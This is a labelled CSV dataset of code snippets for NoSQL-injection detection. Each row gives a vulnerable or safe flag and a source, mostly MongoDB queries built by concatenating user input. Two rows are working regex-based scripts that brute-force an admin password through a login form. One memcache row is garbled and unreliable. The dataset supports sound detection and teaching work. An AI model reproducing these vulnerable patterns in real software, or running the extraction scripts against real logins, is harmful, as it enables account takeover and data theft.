code,target,source,link
$query = array('$where' => 'this.name === \''.$name.'\'');,1,Acunetix,https://www.acunetix.com/blog/web-security-zone/nosql-injections/
"BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
                .start(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""")
                .get();

MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"BasicDBObject query = new BasicDBObject();
query.append(""sharedWith"", userName);
query.append(""email"", email);

MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"HashMap<String, String> paramMap = new HashMap<>();
paramMap.put(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""");
BasicDBObject query = new BasicDBObject(paramMap);

MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"BasicDBObject query = new BasicDBObject(""$where"",""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""");

MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"<!DOCTYPE html>
<html>
 <head>
  <title>User Profile Lookup</title>
 </head>
 <body>
  <?php
  if (isset($_GET['usersearch']) && !empty($_GET['usersearch'])) {
   try {
   $result = """";
   $conn = new MongoClient('mongodb://127.0.0.1');
   $db = $conn->appUserData;
    $collection = $db->users;
    $search = $_GET['usersearch'];
    $js = ""function () { var query = '"". $usersearch . ""'; return this.username == query;}"";
    print $js;
    print '<br/>';
  
   $cursor = $collection->find(array('$where' => $js));
   echo $cursor->count() . ' user found. <br/>';
  
   foreach ($cursor as $obj) {
     echo 'Name: ' . $obj['name'] . '<br/>';
     echo 'Username: ' . $obj['username'] . '<br/>';
     echo 'Email: ' . $obj['email'] . '<br/>';
     echo '<br/>';
   }
  
 $conn->close();
 } catch (MongoConnectionException $e) {
  die('Error connecting to MongoDB server : ' . $e->getMessage());
 } catch (MongoException $e) {
  die('Error: ' . $e->getMessage());
 }
 }
 ?>


  <b>Enter your username:</b><br>
  <form method=""get"" id=""usersearch"">
   <p>Search <input type=""text"" name=""usersearch"" id=""usersearch"" /> <input type=""submit"" name=""submitbutton""
     value=""Submit"" /></p>
  </form>
  <div id=""results"">
   <?php echo $result; ?>
  </div>
 </body>
</html>",1,GitHub,https://github.com/codingo/NoSQLMap/blob/master/vuln_apps/src/acct.php
"const AllocationsDAO = require(""../data/allocations-dao"").AllocationsDAO;
const {
    environmentalScripts
} = require(""../../config/config"");

function AllocationsHandler(db) {
    ""use strict"";

    const allocationsDAO = new AllocationsDAO(db);

    this.displayAllocations = (req, res, next) => {
        /*
        // Fix for A4 Insecure DOR -  take user id from session instead of from URL param
        const { userId } = req.session;
        */
        const {
            userId
        } = req.params;
        const {
            threshold
        } = req.query;

        allocationsDAO.getByUserIdAndThreshold(userId, threshold, (err, allocations) => {
            if (err) return next(err);
            return res.render(""allocations"", {
                userId,
                allocations,
                environmentalScripts
            });
        });
    };
}

module.exports = AllocationsHandler;",1,GitHub,https://github.com/OWASP/NodeGoat/blob/master/app/routes/allocations.js
"HashMap<String, String> paramMap = new HashMap<>();
        paramMap.put(""sharedWith"", userName);
        paramMap.put(""email"", email);
        BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
            .start(paramMap)
            .get();

MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"import memcache 
mc = memcache.Client([lecalkost:11211'], debug=0) 
key = input(""Enter the key to retrieye from Memcached: "") 
value = mc.get(key) 

if value is not None: 
             print(f The value of key '{key)' is '{value)."") 
else: 
             print(""Error: Key not found."")",1,SecOps,https://secops.group/a-pentesters-guide-to-nosql-injection/
"<?php
$con = new MongoDB\Driver\Manager(“mongodb://localhost:27017”);
if(isset($_POST['user']) && isset($_POST['pass'])){
  $user = $_POST['user'];
  $pass = $_POST['pass'];
  $q = new MongoDB\Driver\Query(['username' => $user, 'password' => $pass]);
  $record = $con->executeQuery('myapp.login', $q);
  $record = iterator_to_array($record);
  if(sizeof($record) > 0){
    session_start();
    $_SESSION['loggedin'] = true;
    $_SESSION['uid'] = $record[0]->username;
    header('Location: /sekr3tPl4ce.php');
    die();
  }
}
header('Location: /?err=1');",1,Medium,https://anas0x1.medium.com/whats-nosql-injection-and-how-to-exploit-it-6acad517d50e
"BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
                .start()
                .append(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""")
                .get();

MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username=""admin""
password=""""
u=""http://example.org/login""
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print(""Found one more char : %s"" % (password+c))
                password += c
",1,GitLab,https://gitlab.com/pentest-tools/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass
"import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username=""admin""
password=""""
u=""http://example.org/login""
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{""username"": {""$eq"": ""%s""}, ""password"": {""$regex"": ""^%s"" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print(""Found one more char : %s"" % (password+c))
                password += c
",1,GitLab,https://gitlab.com/pentest-tools/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass
